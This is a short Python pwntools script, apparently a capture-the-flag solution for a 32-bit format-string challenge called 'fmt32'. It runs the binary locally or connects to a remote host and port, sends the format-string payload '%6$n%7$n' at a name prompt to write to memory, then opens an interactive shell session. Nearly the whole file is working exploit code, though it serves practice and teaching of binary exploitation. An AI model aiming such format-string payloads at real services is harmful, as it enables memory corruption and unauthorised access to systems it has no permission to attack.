#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="i386", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./fmt32')
else:
    p = remote('47.106.94.13', 50009)

# gdb.attach(p, "b *0x08048770\nc")
pd = '%6$n%7$n'
p.sendlineafter('Tell me your name:\n', pd)
p.interactive()
